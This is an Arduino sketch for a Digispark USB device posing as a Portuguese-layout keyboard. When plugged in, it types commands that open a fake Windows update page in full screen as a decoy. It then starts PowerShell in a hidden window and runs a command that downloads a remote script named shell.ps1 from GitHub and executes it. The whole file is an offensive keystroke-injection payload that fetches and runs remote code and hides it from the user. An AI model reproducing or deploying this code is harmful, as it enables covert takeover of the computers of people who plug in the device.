#include "DigiKeyboardPtBr.h"
#include "DigiKeyboard.h"

#define keyboard DigiKeyboardPtBr

void setup() {
    // put your setup code here, to run once:
   keyboard.delay(3000);
}

void loop() {
  // put your main code here, to run repeatedly:
  keyboard.sendKeyStroke(0);
  keyboard.delay(500);
  
  keyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  keyboard.delay(600);
  keyboard.print("https://fakeupdate.net/win10ue/");
  keyboard.sendKeyStroke(KEY_ENTER);
  keyboard.delay(1000);
  keyboard.sendKeyStroke(KEY_F11);
  keyboard.delay(3000);

  keyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  keyboard.delay(3000);
  keyboard.print("powershell");
  keyboard.delay(500);
  keyboard.sendKeyStroke(KEY_ENTER);
  keyboard.delay(3000);
  keyboard.println("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/araujoricardo/Digispark/main/shell.ps1');");  

  for(;;){ /*empty*/ }
}
